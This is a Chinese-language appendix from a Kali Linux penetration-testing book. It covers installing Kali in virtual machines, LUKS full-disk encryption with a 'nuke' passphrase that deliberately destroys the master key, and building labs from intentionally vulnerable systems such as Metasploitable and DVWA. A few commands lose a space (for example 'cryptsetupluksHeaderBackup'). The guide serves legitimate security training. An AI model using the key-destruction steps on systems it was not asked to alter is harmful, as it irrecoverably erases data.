+   Kali 支持两种类型的网络安装——**迷你 ISO**安装和**网络 PXE**安装。迷你 ISO 在系统上安装了一个缩减版的 Kali 发行版，然后依赖快速网络连接来安装其余所需的应用程序，以获得有效的最终产品。网络 PXE 安装在引导过程中支持终端（没有 CD-ROM 和 USB 端口），获取 IP 地址信息并安装 Kali。

+   现在可以从云中使用 Kali-Amazon EC2 市场提供了 Kali 的 64 位最小镜像（[`aws.amazon.com/marketplace/pp/B00HW50E0M`](https://aws.amazon.com/marketplace/pp/B00HW50E0M)）。Kali 镜像是免费的，用户只需支付常规的 AWS 使用费。

### 提示

由于亚马逊的规定，此版本的 Kali 默认不使用 root 帐户。一旦您从亚马逊获取了 SSH 密钥，您必须以用户身份连接到 Kali 实例，然后切换到 root。您可能需要下载其他工具来支持测试。最后，您必须通知亚马逊，它正在用于合法的安全测试，而不是作为攻击工具。

## 将 Kali Linux 安装到虚拟机

在本书中，Kali 被配置为虚拟机（VM）。在进行渗透测试时，虚拟机具有以下优势：

+   可以开发和维护一个常见的测试虚拟机，确保测试人员熟悉工具集及其对典型目标系统的影响。

+   虚拟机可以快速在主机和客户操作系统之间切换，允许测试人员在 Windows 和 Linux 平台之间移动，以找到测试的最佳工具组合。

+   虚拟机是可移动的-它们可以移动到不同的系统和操作平台。

+   虚拟机可以保留在库中以便进行回归测试。在使用一组工具验证网络或系统的安全性后，测试人员经常被问及他们的方法和工具是否会检测到测试时存在的特定漏洞。测试人员可以返回并使用存档的虚拟机重新测试漏洞，以确定是否会被检测到或网络是否处于受攻击的风险中。

虽然可以下载预制的虚拟机，但大多数测试人员使用经过验证的 ISO 镜像创建自己的虚拟机（将 Kali 安装到虚拟机的过程几乎与将其安装到硬盘或媒体（如 USB 键）相同）。Kali 支持 VMware 和 Oracle VirtualBox 虚拟机。

总的来说，该过程简单且由应用程序向导引导您完成。例如，使用 VMware 时，该过程如下：

1.  选择**创建新虚拟机**图标以创建新的虚拟机。

1.  选择使用 ISO 镜像创建虚拟机。

1.  选择客户操作系统。

1.  设置 ISO 镜像的名称和位置。

1.  设置磁盘空间；最小使用量应为 12 GB，但至少要留出 20-25 GB。至少应为虚拟机提供 1 GB 内存；但是，如果您要测试大型网络并将使用多线程工具，则可能希望将其增加至至少 3 GB。

1.  审查硬件配置。

### 提示

确保虚拟机配置为仅对主机操作系统可见，特别是如果尚未更新。如果您正在配置虚拟机用作目标，请注意，如果它对互联网可见，您的测试平台可能会受到外部攻击者的威胁。

1.  启动虚拟机。引导菜单将提供几个选项；选择**图形安装**。

1.  按照提示选择正常语言、时区、主机名和设置 root 密码。

1.  在设置磁盘分区时，如果不使用双引导选项，可以将整个分区设置为虚拟磁盘。建议您在此时选择此选项进行全盘加密。

1.  虚拟机应用程序将完成分区，将更改写入磁盘，然后安装系统文件。在提示输入一些额外的配置信息后，虚拟机将重新启动。

1.  此时，系统已经启动。按照第一章中描述的配置支持渗透测试，*开始使用 Kali Linux*。

### 提示

Kali 的预配置分发通常依赖于默认的用户名和密码，并可能具有预生成的 SSH 主机密钥。这些应尽快更改。

## 全盘加密和清除主密钥

渗透测试人员通常手中持有敏感信息-成功的测试可以揭示客户网络中的缺陷，甚至用于进行渗透测试的工具在某些司法管辖区可能被视为非法。因此，测试人员经常使用全盘加密来保护其系统。

在安装到硬盘或虚拟机的分区阶段，Kali 可以设置为使用**逻辑卷管理**（**LVM**）和**Linux 统一密钥设置**（**LUKS**）的组合进行全盘加密，这是 Linux 硬盘加密的标准应用程序。如下图所示：

![全盘加密和销毁主密钥](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_Appendix_01.jpg)

访问加密驱动器需要密码短语，并建议密码短语长度为 20 个或更多字符。不幸的是，鉴于最近出现的国家赞助的监视，有人担心测试人员可能会被迫向政府特工提供密码短语，从而消除加密的好处。

解决方案是提供一个将销毁或破坏主密钥的密码短语。这将确保机密性，使得无法解密驱动器。这一功能最近添加到 Kali Linux 1.06 版本中。

Kali Linux 集成了 LUKS，这是一个平台无关的加密规范，允许用户对硬盘上的分区进行加密。LUKS 允许多个用户密钥解密主密钥，允许多个用户对数据进行加密和解密，并允许使用备份密钥。

创建 LUKS 加密容器时，会生成一个随机主密钥。该主密钥使用密码短语进行加密。这种方法的优势在于密码短语不直接与数据相关联-如果两个相同的卷被加密并使用相同的密码短语，则主密钥仍然是唯一的，并且不能互换。

这意味着如果主密钥丢失或损坏，就不可能恢复加密数据。这种属性允许我们通过故意擦除主密钥来销毁加密卷或硬盘的恢复，如果输入特定密码短语。紧急自毁功能是在 Kali Linux 1.06 版本中添加的，并可以使用 cryptsetup 实用程序实现。

要使用销毁功能：

1.  使用**全盘加密**选项安装 Kali。在安装 Kali 之前，所有分区将被擦除；这将导致安装速度变慢。

1.  使用以下命令验证加密硬盘的 LUKS 头信息：

```
root@kali:~# cryptsetup luksDump /dev/sda5

```

**密钥槽 0**，与磁盘加密密码相关联，已启用。其余密钥槽未使用。以下是先前命令的执行结果：

![全盘加密和销毁主密钥](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_Appendix_02.jpg)

1.  使用以下命令添加`销毁`密钥：

```
root@kali:~# cryptsetup luksAddNuke /dev/sda5

```

系统将提示您输入现有密码短语以验证身份，然后要求您输入新密码短语以用于销毁选项。请注意-它不会提示用户重复输入密码短语，以防止输入错误。以下是先前命令的执行结果：

![全盘加密和销毁主密钥](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_Appendix_03.jpg)

1.  要确认销毁密钥是否已启用，请查看可用密钥槽的列表，使用以下命令：![全盘加密和销毁主密钥](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_Appendix_04.jpg)

`密钥槽 1`现在已启用；它包含销毁密钥。

1.  使用以下命令备份密钥：

```
root@kali:~# cryptsetupluksHeaderBackup --header-backup-file 
  <filename> /dev/sda5 

```

1.  主密钥文件备份后，对其进行加密并将其转移到系统外进行安全存储。有几种应用程序可用于加密（例如，7 Zip，bcrypt，ccrypt 和 GnuPG），或者您可以使用内部命令，如`openssl`。示例命令如下：

```
root@kali:~# opensslenc -aes-256-cbc -salt -in <filename>
  -out <encrypted filename.enc> 

```

当备份文件被保护后，您的系统将受到强制密码提取的保护。如果输入了核弹密码，主密钥的本地副本将被销毁，从而无法访问加密文件。

如果在输入核弹密码后转储 LUKS 头部，您将看到如下截图所示的输出：

![全盘加密和销毁主密钥](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_Appendix_05.jpg)

如果您想恢复一个被迫销毁的驱动器？只要您可以从远程存储位置检索加密头部，这就是一个简单的问题；您将能够解密硬盘并恢复数据。一旦解密了加密头部（使用基于保护文件的方法的适当解密命令），输入以下命令：

```
root@kali:~# cryptsetupluksHeaderRestore --header-backup-file 
  <filename> /dev/sda5 

```

这将生成以下警告：

```
Device /dev/sda5 already contains LUKS header, Replacing header will 
  destroy existing keyslots. Are you sure? 

```

当提示时，输入`YES`。这将替换头部并允许您解密硬盘。

# 建立测试环境

在测试生产环境之前，测试人员充分了解如何使用测试工具，它们对目标系统的影响，以及如何解释与针对目标执行的活动相关的数据是非常重要的。

在受控环境中进行测试通常会产生与在生产系统上运行相同测试时不同的结果，原因包括以下几点：

+   目标环境中的操作系统与测试环境中的操作系统不同，包括操作系统的不同版本。（XP 与 Windows 8.1 显然不同，但 Windows 8.1 专业版和企业版之间或 32 位和 64 位操作系统之间也存在差异。）为了支持本地语言而对操作系统进行的修改也可能对漏洞的存在产生重大影响。

+   目标环境具有不同的服务包、补丁或升级。

+   目标环境安装了不同的第三方应用程序；这些应用程序可能与网络流量冲突，引入新的漏洞，或影响测试人员利用现有漏洞的能力。

+   在主机环境中配置为虚拟机的目标可能与直接安装在裸机上的目标系统有不同的反应。

+   目标受到各种网络和系统设备以及应用程序的保护。

为了获得最佳结果，测试人员（和攻击者）通常使用两阶段测试过程。测试人员首先使用一个明确定义的虚拟机（如 Windows XP）执行攻击，以确定最有效的攻击工具和方法；一旦这个简单的测试案例被证明，测试人员会使用一个更复杂的虚拟或物理网络重新验证攻击，尽可能地模拟目标网络。

## 易受攻击的操作系统和应用程序

测试人员通常会维护当前和历史操作系统的库。

在测试微软操作系统时，WinXP 被用作测试漏洞的*参考标准*。尽管 Windows XP 将在 2014 年停用，并且不再得到微软的支持，但它将继续存在于许多网络中的服务器和工作站，以及嵌入在打印机和销售点终端等设备中。

在测试易受攻击的 Windows 操作系统时，订阅 MSDN（[`msdn.microsoft.com/en-ca/subscriptions/aa336858`](http://msdn.microsoft.com/en-ca/subscriptions/aa336858)）是非常宝贵的，以便获得实验室中测试当前微软产品的访问权限。

### 提示

不要使用从公共文件共享服务（如 Torrent 站点）下载的操作系统。DigitalDefence 最近评估了从 Torrent 站点下载的 40 个微软操作系统下载 - 每个下载都被感染了一个后门，以允许攻击者远程访问。

要测试具有特定漏洞的旧第三方 Windows 应用程序，测试人员可以访问保留旧应用程序副本的在线存储库；其中许多包括可利用的漏洞。此类存储库的示例可在以下链接中看到：

+   [`www.oldapps.com`](http://www.oldapps.com)

+   [www.oldversion.com](http://www.oldversion.com)

由于它们的开源性质，多个版本的类 Unix 操作系统（Linux、BSD 和 Solaris）可供下载和测试。

以下项目将允许您测试已知漏洞的 Unix 操作系统安装，您可以访问：

+   Damn Vulnerable Linux ([`sourceforge.net/projects/virtualhacking/files/os/dvl/`](http://sourceforge.net/projects/virtualhacking/files/os/dvl/))

+   LAMPSecurity ([`sourceforge.net/projects/lampsecurity/`](http://sourceforge.net/projects/lampsecurity/))

+   Metasploitable2 ([`sourceforge.net/projects/virtualhacking/files/os/metasploitable/`](http://sourceforge.net/projects/virtualhacking/files/os/metasploitable/))

通常可以在应用程序的网站上下载具有已知漏洞的旧 Unix 应用程序。

可以从 VulnHub 存储库（[`vulnhub.com`](http://vulnhub.com)）下载用于测试的复杂环境（操作系统和易受攻击的应用程序）。这些镜像通常附有演练，演示了利用镜像的各种方法。其中一些镜像包括以下内容：

+   **bWAPP**：这提供了几种方法来破坏示例网站

+   **VulnVPN**：这允许测试人员利用 VPN 服务以访问服务器和内部服务并获得 root 访问权限

+   **VulnVoIP**：这允许测试人员进行侦察并允许利用 VoIP 网络

最后，测试人员将希望利用一些可用于测试的易受攻击的基于 Web 的应用程序。

最常见的测试目标之一是名为 Metasploitable 的 Linux 镜像。基本操作系统存在多个漏洞；此外，它在启动时加载易受攻击的 Web 应用程序。要访问这些应用程序，请将 Metasploitable 作为 VM 打开，然后启动一个带有 Kali Linux 的单独 VM。在 Kali VM 中，打开浏览器并输入 Metasploitable VM 的 IP 地址。您将看到菜单选项，如下图所示：

![易受攻击的操作系统和应用程序](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_Appendix_06.jpg)

基于 Web 的应用程序可以用于支持企业测试以及针对 Web 应用程序的特定攻击。以下是五个应用程序：

+   **TWiki**：这是一个支持企业协作的维基应用程序，在测试过程中使用结构化内容创建简单的工作流系统

+   **phpmyadmin**：允许通过 Web 远程管理 MySQL 数据库

+   **webdav**：**Web 分布式创作和版本控制**的一组扩展，允许用户协作编辑和管理远程 Web 服务器上的文件

+   **Mutillidae**：一个易受攻击的 Web 黑客应用程序，由易受攻击的 PHP 脚本组成，易受 OWASP 前 10 个漏洞的影响

如您在以下屏幕摘录中所见，前 10 个漏洞可在下拉菜单中找到。例如，选择选项**A2 - 跨站脚本**（**XSS**）将使您访问与特定漏洞类型匹配的子菜单（**反射**，**持久**，**DOM 注入**等）。

![易受攻击的操作系统和应用程序](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_Appendix_07.jpg)

### 提示

`Mutillidae`配置文件中指定的数据库是不正确的，您可能会收到需要数据库访问的多个错误。要解决这些问题，请登录到 Metasploitable2 并编辑`/var/www/mutillidae/config.inc`文件；将`dbname`字段从`metasploit`更改为`owasp10`。

+   最后，Metasploitable 框架启动了**Damn Vulnerable Web Application**（**DVWA**），提供了一组不同的挑战，以练习针对特定漏洞的攻击。![易受攻击的操作系统和应用程序](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_Appendix_08.jpg)

其他易受攻击的基于 Web 的应用程序已经得到了很好的描述，包括以下内容：

+   **Hackxor**：这是一个 Web 应用程序黑客游戏，迫使玩家通过故事解决与各种漏洞相关的挑战（[`hackxor.sourceforge.net/cgi-bin/index.pl`](http://hackxor.sourceforge.net/cgi-bin/index.pl)）。

+   **Foundstone**：这个公司发布了一系列易受攻击的 Web 应用程序，包括银行、书店、赌场、航运和旅行网站（[www.mcafee.com/us/downloads/free-tools/index.aspx](http://www.mcafee.com/us/downloads/free-tools/index.aspx)）。

+   **LAMPSecurity**：这提供了一系列易受攻击的虚拟机，旨在教授 Linux、Apache、PHP 和数据库安全性（[`sourceforge.net/projects/lampsecurity/files/`](http://sourceforge.net/projects/lampsecurity/files/)）。

+   **OWASP Broken Web Applications Project**：这是一系列易受攻击的 Web 应用程序（[`code.google.com/p/owaspbwa/`](http://code.google.com/p/owaspbwa/)）。

+   **WebGoat**：这是一个不安全的 J2EE Web 应用程序，试图提供一个真实的测试环境。它由 OWASP 维护（[`www.owasp.org/index.php/Category:OWASP_WebGoat_Project`](https://www.owasp.org/index.php/Category:OWASP_WebGoat_Project)）。

+   **Web Security Dojo**：这是由 Maven Security 发布的培训应用程序（[`www.mavensecurity.com/web_security_dojo/`](https://www.mavensecurity.com/web_security_dojo/)），包含几个目标图像，包括 Damn Vulnerable Web App、Google 的 Gruyere、Hackme 的 Casino、OWASP 的 Insecure Web App 和 WebGoat、w3af 的测试网站，以及几个特定漏洞的目标。它还包含一套工具来支持利用。
